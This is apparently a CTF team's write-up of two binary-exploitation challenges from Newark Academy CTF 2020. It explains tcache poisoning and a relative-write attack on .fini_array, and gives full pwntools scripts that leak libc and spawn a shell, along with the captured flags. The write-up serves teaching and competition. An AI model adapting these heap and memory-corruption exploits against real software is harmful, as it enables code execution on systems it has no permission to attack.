# Newark Academy CTF 2020 Internal

b1c takes third global and first in highschools (We stole Gabe for one algo challenge *again*).

We also maintained the b1c tradition of dropping from 1st to 3rd due to a single challenge (*ahem* veggie factory 5 *ahem*) :upside_down_face:


## Grade calculator

Coming soon after admins finish verifications :D


## Covid tracker tracker tracker

No PIE, so we can poison tcache and point it to `setvbuf@got` to read a libc pointer. Then, we can poison tcache again to write `system` to `__libc_free_hook`.

We have to do some fiddling with the amount of trackers we create to ensure we can recover from the initial tcache poison. The tcache will look something like `HEAD -> <actual chunks> -> setvbuf@got -> setvbuf@libc -> <bad memory>`. Any further allocations past setvbuf@libc would cause a segfault.

We can fix this by creating an excess of freeable chunks before poisoning, and freeing them to the head of the desired tcache bin after our first poison, creating a sort of "buffer" of newly poisonable chunks.

Then, just tcache poison to overwrite `__libc_free_hook` with `system` and free a chunk with `/bin/sh`.


```python=
from pwn import *

e = ELF("./cttt")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("challenges.ctfd.io", 30252)

context.log_level="debug"
gdb.attach(p, """c""")

def add():
    p.sendlineafter(">", "1")


def edit(idx, n):
    p.sendlineafter(">", "2")
    p.sendlineafter("?", str(idx))
    p.sendlineafter("?", n)


def remove(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter("?", str(idx))


def show():
    p.sendlineafter(">", "4")



add()   #1
add()   #2
add()   #3
add()   #4
add()   #5
add()   #6
add()   #7
add()   #8
add()   #9
add()   #10
edit(10, "/bin/sh")



remove(6)
remove(5)
remove(4)
remove(3)
remove(2)
remove(1)


edit(1, p64(e.got["setvbuf"]))



add()   #11
add()   #12

show()

p.recvuntil("12) ")

libc.address = u64(p.recv(6).ljust(8, "\x00")) - 529136


print("libc base", hex(libc.address))


remove(7)

edit(7, p64(libc.sym["__free_hook"]))

add()   #13
add()   #14

edit(14, p64(libc.sym["system"]))

remove(10)



p.interactive()
```

Flag: `nactf{d0nt_us3_4ft3r_fr33_zsouEFF4bfCI5eew}`


## Tale of two
We get one relative read and one relative write. We can read a libc pointer at offset -4 and we can write a one_gadget to .fini_array at offset -75.

```python=
from pwn import *

e = ELF("./tale-of-two")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process(e.path)
p = remote("challenges.ctfd.io", 30250)


context.log_level="debug"
gdb.attach(p, """b * main+190
           b * main+233
           c""")


#read

p.sendlineafter("?", "-4")

p.recvline()

libc.address = int(p.recvline().strip(), 16) - 507584

print("libc base", hex(libc.address))




#write a one gadget to .fini_array, which is at offset -600/8 == -75

og = libc.address + 0x4f322

print("one gadget", hex(og))

p.sendlineafter("?", "-75")

p.sendlineafter("?", str(og))


p.interactive()
```

Flag: `nactf{a_l0n3ly_dt0r_4nd_a_sh3ll_tUIlF0jxW5aMXoGo}`
